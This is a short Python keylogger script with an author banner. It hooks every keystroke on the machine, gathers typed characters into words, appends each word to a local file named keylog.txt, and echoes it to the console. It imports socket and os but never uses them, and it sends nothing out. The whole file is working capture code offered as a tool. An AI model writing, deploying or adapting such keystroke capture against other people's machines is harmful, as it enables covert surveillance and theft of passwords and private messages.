import keyboard
import sys
import socket
import os

from colorama import Back, Fore, init
init()

print(Fore.YELLOW + """
==========================================================
=                      Made by:                          =
=                    dev4lentinho                        =
==========================================================
      """)


word = ""

def pulsacion_tecla(pulsacion):
    
    global word
    
    if pulsacion.event_type == keyboard.KEY_DOWN:
        if pulsacion.name == "space":
            save_word_as_space()
        elif len(pulsacion.name) == 1 and pulsacion.name.isprintable():
                word += pulsacion.name
            
            

keyboard.hook(pulsacion_tecla)

def save_word_as_space():
    with open("keylog.txt", "a") as file:
        
        file.write(word + "\n")
    print(Fore.GREEN + "Registered word:",word)
    reset_word()

def reset_word():
    global word
    word = ""
    
try:
    keyboard.wait("esc")
except KeyboardInterrupt:
    print("script stopped")
    pass
